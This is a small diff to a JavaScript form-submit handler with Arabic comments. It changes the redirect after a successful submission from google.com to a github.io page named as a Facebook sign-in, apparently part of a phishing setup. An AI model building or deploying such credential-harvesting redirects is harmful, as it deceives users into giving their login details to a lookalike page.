@@ -16,7 +16,7 @@ form.addEventListener("submit", async (event) => {
 
   if (response.ok) {
     // هنا تضع الرابط الذي تريد توجيه المستخدم إليه مجاناً
-    window.location.href = "https://www.google.com"; 
+    window.location.href = "https://kurayami-kun.github.io/facebook/sign_in.html"; 
   } else {
     alert("حدث خطأ أثناء الإرسال، حاول مجدداً.");
   }
